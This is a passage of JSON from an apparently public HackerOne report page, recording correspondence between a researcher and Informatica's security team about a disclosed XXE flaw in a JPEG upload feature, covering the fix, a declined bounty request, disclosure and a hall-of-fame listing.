well. Any news? Need help? Thank you!","automated_response":false,"created_at":"2020-04-07T18:35:03.260Z","updated_at":"2020-04-07T18:35:03.260Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7617335,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @aks_infa and @kmcgaley. Any news? Were you able to reproduce and fix the problem? I can retest if you need it. Thank you!","automated_response":false,"created_at":"2020-04-10T15:04:58.748Z","updated_at":"2020-04-10T15:04:58.748Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7647430,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry @kmcgaley and @aks_infa but it's been 10 days since your last contact. Can you please update? Thank you very much!","automated_response":false,"created_at":"2020-04-13T19:25:31.607Z","updated_at":"2020-04-13T19:25:31.607Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7654869,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @moebius - sorry for the delay in getting back to you, this issue was closed out. The feature was disabled and redirects were setup for the vulnerable endpoint to mitigate. Thanks for the report - in recognition we are happy to add you to our security hall of fame - is this is something you would like please let us know your preferred name for this.","automated_response":false,"created_at":"2020-04-14T10:00:46.291Z","updated_at":"2020-04-14T10:00:46.291Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"moebius","url":"/moebius"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7659807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hey @nheffernan ! no problem. Thank you. Yes, you can use \"Moebius\", that's fine. I know that this program does not usually offer paid bounties (but sometimes you do), can you consider this time that? Because of the severity, the quality of my report and follow ups, the difficulty of exploitation, and the \"hidden\" place I found this, etc.? Other programs pay up to 4K for a vulnerability like this one. Let me know! And thank you for considering that.","automated_response":false,"created_at":"2020-04-14T15:33:15.152Z","updated_at":"2020-04-14T15:33:15.152Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7660380,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @moebius - unfortunately we don't have capability at the moment to award bounties in any cases, but happy to add that name to the hall of fame, we will let you know once it is next updated. ","automated_response":false,"created_at":"2020-04-14T16:02:46.992Z","updated_at":"2020-04-14T16:02:46.992Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7665094,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-04-14T22:33:42.605Z","updated_at":"2020-04-14T22:33:42.605Z","first_to_agree":true,"actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7729595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nheffernan can we disclose? Thank you!","automated_response":false,"created_at":"2020-04-20T19:33:43.452Z","updated_at":"2020-04-20T19:33:43.452Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7729610,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"automated_response":false,"created_at":"2020-04-20T19:35:34.541Z","updated_at":"2020-04-20T19:35:34.541Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"email":"elmago","genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7729619,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","automated_response":false,"created_at":"2020-04-20T19:36:57.629Z","updated_at":"2020-04-20T19:36:57.629Z","actor":{"username":"elmago","cleared":true,"url":"/elmago","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/rvYJ26zvLFPdXdS7tQ3C1PJZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7735937,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-04-21T09:29:34.830Z","updated_at":"2020-04-21T09:29:34.830Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7735938,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-04-21T09:29:34.919Z","updated_at":"2020-04-21T09:29:34.919Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7735983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @moebius - Sure, i've redacted some of the sensitive information (or screenshots containing same) and added a quick summary. Thanks again for the report.","automated_response":false,"created_at":"2020-04-21T09:30:51.426Z","updated_at":"2020-04-21T09:30:51.426Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8071300,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi  @moebius \nWe have updated our \"Hall of Fame\" page.\nYou can check your name on https://www.informatica.com/trust-center/security-researcher-hall-of-fame.html\nThank you again for your effort.","automated_response":false,"created_at":"2020-05-21T17:04:33.779Z","updated_at":"2020-05-21T17:04:33.779Z","actor":{"username":"aks_infa","cleared":false,"url":"/aks_infa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":21381,"category":"team","content":"Researcher identified an XXE issue via a JPEG file upload. Researcher worked with us to validate the vulnerability, managed to escalate to return the contents of /etc/passwd and confirmed the issue was then fixed. Informatica responded by initially disabling the feature and then further blocking access to the vulnerable endpoint. Our thanks to moebius for the report, and the detailed writeup associated with it. Some technical details have been redacted in the below. \n\nShould there be any queries, please contact us via security@informatica.com ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":582228,"username":"nheffernan","name":"Niall Heffernan","bio":null,"cleared":false,"website":null,"location":null,"created_at":"2019-04-15T10:34:20.268Z","url":"https://hackerone.com/nheffernan","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}